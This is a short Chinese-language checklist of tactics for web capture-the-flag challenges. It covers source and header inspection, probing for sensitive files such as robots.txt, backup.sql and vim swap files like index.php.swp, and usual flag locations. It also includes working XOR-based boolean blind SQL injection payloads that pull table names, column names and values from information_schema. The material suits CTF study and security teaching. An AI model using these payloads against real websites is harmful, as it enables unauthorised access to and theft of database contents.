拿到题，访问web。
查看源码 仔细查看或者搜索关键词，如flag,include等，提示方向。

F12查看网络请求情况。
最好抓包，仔细查看请求头，响应头信息。

查看传参，回显情况。sql注入，文件包含，模板注入。

目录测试，如flag.php，robots.txt
探针/tz.php，/backup.sql

临时文件是在vim编辑文本时就会创建的文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。所以通过在url后面加上/index.php.swp即可看到flag。
以index.php来说，第一次退出后，缓存文件名为index.php.swp，第二次退出后，缓存文件名为index.php.swo,第三次退出后文件名为index.php.swn。

^
一般flag在/flag或/flag.txt中，也可能在env命令环境变量中，还可能在phpinfo()中。

^
## **sql注入考点**
部分sql盲注入如逻辑布尔盲注，需要使用代码一个一个字符跑出来。

异或盲注?id=1^1^1
在这个前提下，进行布尔盲注，代码中使用二分法加快布尔盲注。
```
获取表名
1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))>0)^1
[*] F1naI1y,Flaaaaag~
猜测列名
1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='表名')),1,1))>0)^1
猜测值
1^(ord(substr((select(group_concat(列名))from(表名)),1,1))>0)^1
```

案例：
<https://www.cnblogs.com/upfine/p/16367693.html#:~:text=%E5%88%86%E4%BA%AB%E4%B8%8B%E8%87%AA%E5%B7%B1%E5%9C%A8%E5%AE%8C%E6%88%90%20[>